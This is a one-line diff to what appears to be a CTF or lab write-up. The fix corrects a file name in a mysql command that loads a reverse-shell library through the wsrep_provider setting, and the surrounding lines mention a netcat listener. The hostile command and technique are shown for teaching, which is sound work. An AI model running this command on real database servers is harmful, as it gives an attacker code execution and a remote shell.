@@ -74,7 +74,7 @@ We create our malicious binary in which we will insert a reverse shell.
 
 Afterwards, we will put a **netcat** listening and execute the following command.
 ```bash
-mysql -u zabbix -p -e 'SET GLOBAL wsrep_provider="/tmp/m3so";'
+mysql -u zabbix -p -e 'SET GLOBAL wsrep_provider="/tmp/m3.so";'
 ```
 ![](19.png)
 
